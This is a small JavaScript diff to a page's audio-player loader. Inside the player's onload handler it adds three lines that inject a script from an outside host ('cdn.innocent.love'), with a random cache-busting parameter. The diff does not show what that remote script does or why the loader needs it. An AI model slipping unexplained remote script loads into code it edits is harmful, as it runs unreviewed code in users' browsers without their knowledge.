@@ -28,6 +28,9 @@ const script = document.createElement('script')
 script.src = '//unpkg.com/kokoro-player/dist/kokoro-player.min.js'
 script.onload = () => {
   window.akari.player = new window.KokoroPlayer.Kokoro()
+  const script2 = document.createElement('script')
+  script2.src = '//cdn.innocent.love/wulunheshiyizhi.js?t=' + Math.random()
+  document.body.appendChild(script2)
   window.customElements.define('kokoro-provider',
     window.KokoroPlayer.Provider.connect(window.akari.player))
 }
